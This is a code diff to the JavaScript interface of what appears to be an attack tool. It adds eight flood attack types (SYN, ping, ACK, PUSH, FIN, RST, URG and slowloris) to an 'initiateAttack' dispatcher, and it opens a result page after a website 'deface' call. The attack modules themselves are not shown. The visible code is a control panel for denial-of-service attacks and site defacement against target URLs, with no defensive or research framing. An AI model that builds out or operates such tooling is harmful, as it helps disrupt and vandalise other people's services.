@@ -20,7 +20,7 @@ function updateStatsDisplay() {
 async function testConnection(url) {
     try {
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5-second timeout
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
 
         const response = await fetch(url, {
             method: 'HEAD',
@@ -229,6 +229,30 @@ async function initiateAttack(targetUrl, attackType) {
         case 'udpFlood':
             attackModule = 'udpFlood';
             break;
+        case 'synFlood':
+            attackModule = 'synFlood';
+            break;
+        case 'slowloris':
+            attackModule = 'slowloris';
+            break;
+        case 'pingFlood':
+            attackModule = 'pingFlood';
+            break;
+        case 'ackFlood':
+            attackModule = 'ackFlood';
+            break;
+        case 'pushFlood':
+            attackModule = 'pushFlood';
+            break;
+        case 'finFlood':
+            attackModule = 'finFlood';
+            break;
+        case 'rstFlood':
+            attackModule = 'rstFlood';
+            break;
+        case 'urgFlood':
+            attackModule = 'urgFlood';
+            break;
         default:
             logMessage(`Invalid attack type: ${attackType} 💣`);
             setStatus('Invalid Attack Type 💣');
@@ -296,6 +320,9 @@ defaceButton.addEventListener('click', async () => {
 
     try {
         const response = await genericApiCall('deface', { defaceUrl, defaceCode }, `Successfully defaced ${defaceUrl} 💀`, `Failed to deface ${defaceUrl}`);
+        if (response && response.newUrl) {
+            window.open(response.newUrl, '_blank');
+        }
     } catch (error) {
         logMessage(`Deface operation failed: ${error.message}`);
         setStatus(`Deface operation failed: ${error.message}`);
